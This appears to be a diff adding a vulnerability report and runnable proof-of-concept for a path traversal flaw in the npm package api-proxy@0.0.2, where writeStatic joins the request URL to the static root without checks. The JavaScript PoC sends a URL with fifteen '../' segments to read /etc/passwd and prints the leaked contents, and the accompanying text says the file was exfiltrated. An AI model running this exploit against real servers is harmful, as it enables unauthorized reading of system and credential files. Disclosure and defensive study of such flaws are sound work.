@@ -1,0 +1,35 @@
+Confirmed: `api-proxy`'s `writeStatic` (lib/static.js) builds the served file path via `Path.join(root, req.url)` without stripping `../` sequences, allowing arbitrary file reads outside the intended `www` directory. Successfully exfiltrated `/etc/passwd`.
+
+```javascript
+// PoC: Path Traversal in api-proxy@0.0.2 (lib/static.js -> writeStatic)
+//
+// writeStatic() builds the on-disk path with:
+//   filepath = Path.join(rootDir, req.url.replace(/[?#][\s\S]*/, ''))
+// It never validates that `filepath` stays inside `rootDir`, so a URL
+// containing "../" sequences lets an attacker read arbitrary files on
+// the host filesystem (e.g. /etc/passwd) via fs.readFile/fs.stat.
+//
+// Run with: node snippet.js
+
+const staticMod = require("api-proxy/lib/static.js");
+
+// Craft a request whose "url" walks far enough up the directory tree to
+// escape the package's "www" static root, then targets a sensitive file.
+const maliciousUrl = "/" + "../".repeat(15) + "etc/passwd";
+
+const req = { url: maliciousUrl };
+const res = {
+  writeHead(statusCode, headers) {
+    console.log("[*] Response status:", statusCode, headers);
+  },
+  write(data) {
+    console.log("[!] Path traversal succeeded — leaked file content:\n");
+    console.log(data.toString());
+  },
+  end() {},
+};
+
+staticMod.writeStatic(req, res, () => {
+  console.log("[-] Traversal blocked (file not found under root)");
+});
+```
